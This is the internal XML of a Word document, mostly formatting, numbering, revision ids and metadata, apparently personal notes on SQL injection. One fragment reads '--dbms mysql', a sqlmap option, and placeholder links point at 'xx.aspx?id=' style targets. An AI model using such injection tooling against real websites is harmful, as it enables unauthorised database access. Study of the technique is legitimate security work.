      <w:tr w:rsidR="00CE2D8A" w:rsidTr="00812A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55EF3" w:rsidRPr="00A55EF3" w:rsidRDefault="00A55EF3" w:rsidP="00A55EF3"/>
    <w:p w:rsidR="009F61D1" w:rsidRDefault="004C14EA" w:rsidP="00BA22DE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lastRenderedPageBreak/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BA22DE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--dbms mysql</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="002F1717" w:rsidP="00BA22DE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F517F1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BA22DE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BA22DE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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr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1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1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7F1" w:rsidRDefault="00F517F1" w:rsidP="0045694B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00F517F1" w:rsidRDefault="00F517F1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7F1" w:rsidRDefault="00F517F1" w:rsidP="0045694B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00F517F1" w:rsidRDefault="00F517F1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5F5D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76064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173207A5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0340143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1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7D624A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="827EACDC"/>
    <w:lvl w:ilvl="0" w:tplc="F216EFF4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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4C6634AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="62B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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F863464"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AD0ADC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9"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="1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6"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="18"/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3"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="42">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="43">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="44">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="45">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="46">
    <w:abstractNumId w:val="5"/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5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5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="55">
    <w:abstractNumId w:val="5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5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="63">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="64">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:numIdMacAtCleanup w:val="6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12075"/>
    <w:rsid w:val="000161A9"/>
    <w:rsid w:val="0001730E"/>
    <w:rsid w:val="00021A56"/>
    <w:rsid w:val="000303C4"/>
    <w:rsid w:val="00030CD4"/>
    <w:rsid w:val="000322A3"/>
    <w:rsid w:val="0005165D"/>
    <w:rsid w:val="00054611"/>
    <w:rsid w:val="00057BE4"/>
    <w:rsid w:val="000620B1"/>
    <w:rsid w:val="00071932"/>
    <w:rsid w:val="00077D92"/>
    <w:rsid w:val="00082ACE"/>
    <w:rsid w:val="00092FB3"/>
    <w:rsid w:val="00094ECB"/>
    <w:rsid w:val="000B29AF"/>
    <w:rsid w:val="000C28C4"/>
    <w:rsid w:val="000C36FD"/>
    <w:rsid w:val="000C6B2C"/>
    <w:rsid w:val="000D2343"/>
    <w:rsid w:val="000D3787"/>
    <w:rsid w:val="000D78D4"/>
    <w:rsid w:val="000F184C"/>
    <w:rsid w:val="000F40D1"/>
    <w:rsid w:val="00130DE0"/>
    <w:rsid w:val="00132BB5"/>
    <w:rsid w:val="00136C85"/>
    <w:rsid w:val="00140BF6"/>
    <w:rsid w:val="001420BA"/>
    <w:rsid w:val="00162020"/>
    <w:rsid w:val="00162816"/>
    <w:rsid w:val="00167C97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1F34E6"/>
    <w:rsid w:val="00202978"/>
    <w:rsid w:val="00207CC2"/>
    <w:rsid w:val="0024368F"/>
    <w:rsid w:val="00246CE0"/>
    <w:rsid w:val="00264C7E"/>
    <w:rsid w:val="0026686B"/>
    <w:rsid w:val="002756B5"/>
    <w:rsid w:val="00282253"/>
    <w:rsid w:val="00292265"/>
    <w:rsid w:val="002A0E9B"/>
    <w:rsid w:val="002A2225"/>
    <w:rsid w:val="002C7481"/>
    <w:rsid w:val="002D47A9"/>
    <w:rsid w:val="002F1717"/>
    <w:rsid w:val="003009F5"/>
    <w:rsid w:val="00310146"/>
    <w:rsid w:val="00311E98"/>
    <w:rsid w:val="0031513A"/>
    <w:rsid w:val="003215E6"/>
    <w:rsid w:val="00326167"/>
    <w:rsid w:val="0034523C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075C"/>
    <w:rsid w:val="003E18D9"/>
    <w:rsid w:val="003E63C5"/>
    <w:rsid w:val="00401408"/>
    <w:rsid w:val="00414F9E"/>
    <w:rsid w:val="004157B8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6BA"/>
    <w:rsid w:val="004B7816"/>
    <w:rsid w:val="004C14EA"/>
    <w:rsid w:val="004C3A4D"/>
    <w:rsid w:val="004C5BA2"/>
    <w:rsid w:val="004D044E"/>
    <w:rsid w:val="004E0AB5"/>
    <w:rsid w:val="004E4EBC"/>
    <w:rsid w:val="00500A6C"/>
    <w:rsid w:val="00501516"/>
    <w:rsid w:val="005071EC"/>
    <w:rsid w:val="00511148"/>
    <w:rsid w:val="005124D8"/>
    <w:rsid w:val="00526069"/>
    <w:rsid w:val="005275C7"/>
    <w:rsid w:val="00532934"/>
    <w:rsid w:val="00543A5B"/>
    <w:rsid w:val="00556341"/>
    <w:rsid w:val="00557989"/>
    <w:rsid w:val="00563DC1"/>
    <w:rsid w:val="00565D19"/>
    <w:rsid w:val="00571E2E"/>
    <w:rsid w:val="00572D13"/>
    <w:rsid w:val="005942D1"/>
    <w:rsid w:val="005954FE"/>
    <w:rsid w:val="005A05D3"/>
    <w:rsid w:val="005B6217"/>
    <w:rsid w:val="005B715E"/>
    <w:rsid w:val="005C2440"/>
    <w:rsid w:val="005C7A7D"/>
    <w:rsid w:val="005D1E97"/>
    <w:rsid w:val="005E5F7E"/>
    <w:rsid w:val="005E7A43"/>
    <w:rsid w:val="00620120"/>
    <w:rsid w:val="0065479F"/>
    <w:rsid w:val="00661E9D"/>
    <w:rsid w:val="00681412"/>
    <w:rsid w:val="00697C07"/>
    <w:rsid w:val="006A5654"/>
    <w:rsid w:val="006B12EC"/>
    <w:rsid w:val="006B7F02"/>
    <w:rsid w:val="006C344B"/>
    <w:rsid w:val="006C4ECE"/>
    <w:rsid w:val="006D6806"/>
    <w:rsid w:val="006E564D"/>
    <w:rsid w:val="006E7B29"/>
    <w:rsid w:val="00700865"/>
    <w:rsid w:val="007057C3"/>
    <w:rsid w:val="007153D0"/>
    <w:rsid w:val="007319AD"/>
    <w:rsid w:val="00741D68"/>
    <w:rsid w:val="007531EF"/>
    <w:rsid w:val="00761A17"/>
    <w:rsid w:val="007657E2"/>
    <w:rsid w:val="00785D8D"/>
    <w:rsid w:val="007967E6"/>
    <w:rsid w:val="007A3920"/>
    <w:rsid w:val="007A5594"/>
    <w:rsid w:val="007D0775"/>
    <w:rsid w:val="007D1D00"/>
    <w:rsid w:val="007D74A1"/>
    <w:rsid w:val="007E2B1E"/>
    <w:rsid w:val="00802955"/>
    <w:rsid w:val="00806E53"/>
    <w:rsid w:val="00812AAA"/>
    <w:rsid w:val="00837F80"/>
    <w:rsid w:val="008455C7"/>
    <w:rsid w:val="00850407"/>
    <w:rsid w:val="00855A53"/>
    <w:rsid w:val="00864084"/>
    <w:rsid w:val="00882D69"/>
    <w:rsid w:val="008918F9"/>
    <w:rsid w:val="008948CF"/>
    <w:rsid w:val="008A004F"/>
    <w:rsid w:val="008A2112"/>
    <w:rsid w:val="008A35DC"/>
    <w:rsid w:val="008B48E4"/>
    <w:rsid w:val="008C2891"/>
    <w:rsid w:val="008C7807"/>
    <w:rsid w:val="008D0C3E"/>
    <w:rsid w:val="008E15BD"/>
    <w:rsid w:val="008E66FD"/>
    <w:rsid w:val="008E7485"/>
    <w:rsid w:val="008F0FFA"/>
    <w:rsid w:val="009102A6"/>
    <w:rsid w:val="00911B79"/>
    <w:rsid w:val="00911E7F"/>
    <w:rsid w:val="00912F6A"/>
    <w:rsid w:val="0093213F"/>
    <w:rsid w:val="0093292B"/>
    <w:rsid w:val="009347F9"/>
    <w:rsid w:val="009374DF"/>
    <w:rsid w:val="009717CE"/>
    <w:rsid w:val="00974D28"/>
    <w:rsid w:val="00974D42"/>
    <w:rsid w:val="00985CE4"/>
    <w:rsid w:val="00990028"/>
    <w:rsid w:val="00990DAA"/>
    <w:rsid w:val="00995F2B"/>
    <w:rsid w:val="009A7505"/>
    <w:rsid w:val="009B3905"/>
    <w:rsid w:val="009C3B59"/>
    <w:rsid w:val="009C7E7E"/>
    <w:rsid w:val="009D1325"/>
    <w:rsid w:val="009D3240"/>
    <w:rsid w:val="009E588F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55EF3"/>
    <w:rsid w:val="00A63A45"/>
    <w:rsid w:val="00A64139"/>
    <w:rsid w:val="00A705FA"/>
    <w:rsid w:val="00A71DCA"/>
    <w:rsid w:val="00A92387"/>
    <w:rsid w:val="00AA39CC"/>
    <w:rsid w:val="00AA3C34"/>
    <w:rsid w:val="00AA5689"/>
    <w:rsid w:val="00AA6BA0"/>
    <w:rsid w:val="00AE23DC"/>
    <w:rsid w:val="00AF7813"/>
    <w:rsid w:val="00B253B8"/>
    <w:rsid w:val="00B27159"/>
    <w:rsid w:val="00B27D92"/>
    <w:rsid w:val="00B31676"/>
    <w:rsid w:val="00B3563C"/>
    <w:rsid w:val="00B4027A"/>
    <w:rsid w:val="00B50F25"/>
    <w:rsid w:val="00B52A1C"/>
    <w:rsid w:val="00B575D8"/>
    <w:rsid w:val="00B63AFF"/>
    <w:rsid w:val="00B70E80"/>
    <w:rsid w:val="00B73C62"/>
    <w:rsid w:val="00B74013"/>
    <w:rsid w:val="00B74572"/>
    <w:rsid w:val="00B75BE3"/>
    <w:rsid w:val="00B76438"/>
    <w:rsid w:val="00B7766D"/>
    <w:rsid w:val="00B85FEE"/>
    <w:rsid w:val="00B87869"/>
    <w:rsid w:val="00BA22DE"/>
    <w:rsid w:val="00BA3B72"/>
    <w:rsid w:val="00BB0AB3"/>
    <w:rsid w:val="00BB26FF"/>
    <w:rsid w:val="00BB4338"/>
    <w:rsid w:val="00BB7E5B"/>
    <w:rsid w:val="00BC7723"/>
    <w:rsid w:val="00BD454E"/>
    <w:rsid w:val="00BD7A70"/>
    <w:rsid w:val="00BF397A"/>
    <w:rsid w:val="00C1382B"/>
    <w:rsid w:val="00C168B8"/>
    <w:rsid w:val="00C220F1"/>
    <w:rsid w:val="00C27342"/>
    <w:rsid w:val="00C31384"/>
    <w:rsid w:val="00C31FF2"/>
    <w:rsid w:val="00C415C3"/>
    <w:rsid w:val="00C44C2D"/>
    <w:rsid w:val="00C46C62"/>
    <w:rsid w:val="00C53E25"/>
    <w:rsid w:val="00C8063F"/>
    <w:rsid w:val="00C81A76"/>
    <w:rsid w:val="00C866A7"/>
    <w:rsid w:val="00CA0CA4"/>
    <w:rsid w:val="00CD0DAD"/>
    <w:rsid w:val="00CD16D2"/>
    <w:rsid w:val="00CE24C0"/>
    <w:rsid w:val="00CE2D8A"/>
    <w:rsid w:val="00CF7040"/>
    <w:rsid w:val="00D0368B"/>
    <w:rsid w:val="00D04F53"/>
    <w:rsid w:val="00D06CEC"/>
    <w:rsid w:val="00D3129B"/>
    <w:rsid w:val="00D3333B"/>
    <w:rsid w:val="00D40808"/>
    <w:rsid w:val="00D45364"/>
    <w:rsid w:val="00D77A34"/>
    <w:rsid w:val="00D801D9"/>
    <w:rsid w:val="00D90E12"/>
    <w:rsid w:val="00D91C11"/>
    <w:rsid w:val="00D93936"/>
    <w:rsid w:val="00D94E25"/>
    <w:rsid w:val="00D9527C"/>
    <w:rsid w:val="00D976A0"/>
    <w:rsid w:val="00DA2270"/>
    <w:rsid w:val="00DB157C"/>
    <w:rsid w:val="00DB536C"/>
    <w:rsid w:val="00DC0F40"/>
    <w:rsid w:val="00DD2A2D"/>
    <w:rsid w:val="00DD67DA"/>
    <w:rsid w:val="00DE7D93"/>
    <w:rsid w:val="00DF0994"/>
    <w:rsid w:val="00E02475"/>
    <w:rsid w:val="00E125A6"/>
    <w:rsid w:val="00E173A6"/>
    <w:rsid w:val="00E17B71"/>
    <w:rsid w:val="00E359AB"/>
    <w:rsid w:val="00E362ED"/>
    <w:rsid w:val="00E379F9"/>
    <w:rsid w:val="00E43E47"/>
    <w:rsid w:val="00E46749"/>
    <w:rsid w:val="00E6652B"/>
    <w:rsid w:val="00E72DBD"/>
    <w:rsid w:val="00E72EAA"/>
    <w:rsid w:val="00E9295D"/>
    <w:rsid w:val="00E93783"/>
    <w:rsid w:val="00EA2744"/>
    <w:rsid w:val="00EA505C"/>
    <w:rsid w:val="00EA70E2"/>
    <w:rsid w:val="00EB0C04"/>
    <w:rsid w:val="00EB3236"/>
    <w:rsid w:val="00EB46BA"/>
    <w:rsid w:val="00EB7545"/>
    <w:rsid w:val="00EC226F"/>
    <w:rsid w:val="00EC37A1"/>
    <w:rsid w:val="00ED2871"/>
    <w:rsid w:val="00ED615B"/>
    <w:rsid w:val="00EE5589"/>
    <w:rsid w:val="00EE70F8"/>
    <w:rsid w:val="00F03E3B"/>
    <w:rsid w:val="00F15A54"/>
    <w:rsid w:val="00F16A3F"/>
    <w:rsid w:val="00F20096"/>
    <w:rsid w:val="00F236FC"/>
    <w:rsid w:val="00F4312B"/>
    <w:rsid w:val="00F47AE9"/>
    <w:rsid w:val="00F517F1"/>
    <w:rsid w:val="00F52B9B"/>
    <w:rsid w:val="00F70BBB"/>
    <w:rsid w:val="00F77709"/>
    <w:rsid w:val="00F82588"/>
    <w:rsid w:val="00F971A3"/>
    <w:rsid w:val="00FA71E0"/>
    <w:rsid w:val="00FB0C49"/>
    <w:rsid w:val="00FB3B4F"/>
    <w:rsid w:val="00FC16F5"/>
    <w:rsid w:val="00FD6E10"/>
    <w:rsid w:val="00FF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my"/>
    <w:link w:val="1Char0"/>
    <w:qFormat/>
    <w:rsid w:val="00812AAA"/>
    <w:pPr>
      <w:spacing w:before="160" w:after="160" w:line="480" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:bCs w:val="0"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="2">
    <w:name w:val="笔记2级标题"/>
    <w:basedOn w:val="10"/>
    <w:next w:val="my"/>
    <w:link w:val="2Char0"/>
    <w:qFormat/>
    <w:rsid w:val="00CA0CA4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="38"/>
      </w:numPr>
      <w:spacing w:before="80" w:after="80" w:line="360" w:lineRule="auto"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/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812AAA"/>
    <w:rPr>
      <w:b/>
      <w:bCs w:val="0"/>
      <w:kern w:val="44"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="31">
    <w:name w:val="笔记3级标题"/>
    <w:basedOn w:val="30"/>
    <w:next w:val="a"/>
    <w:link w:val="3Char0"/>
    <w:autoRedefine/>
    <w:qFormat/>
    <w:rsid w:val="006B12EC"/>
    <w:p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CA0CA4"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs w:val="0"/>
      <w:kern w:val="44"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="44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1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8E15BD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8E15BD"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="3">
    <w:name w:val="笔记3级标"/>
    <w:basedOn w:val="10"/>
    <w:next w:val="my"/>
    <w:link w:val="3Char1"/>
    <w:qFormat/>
    <w:rsid w:val="00CA0CA4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="46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1">
    <w:name w:val="笔记3级标 Char"/>
    <w:basedOn w:val="3Char"/>
    <w:link w:val="3"/>
    <w:rsid w:val="00CA0CA4"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs/>
      <w:kern w:val="44"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="my">
    <w:name w:val="my正文"/>
    <w:basedOn w:val="a"/>
    <w:qFormat/>
    <w:rsid w:val="00812AAA"/>
    <w:pPr>
      <w:ind w:firstLineChars="200" w:firstLine="20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image" Target="media/image2.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin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image" Target="media/image3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image" Target="media/image1.png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hyperlink" Target="http://xx.aspx?id=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hyperlink" Target="http://xxx.asp?id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3768</TotalTime>
  <Pages>22</Pages>
  <Words>3849</Words>
  <Characters>21940</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>182</Lines>
  <Paragraphs>51</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>25738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710</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-08-15T08:09:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-08-27T15:14:00Z</dcterms:modified>
</cp:coreProperties>
</file>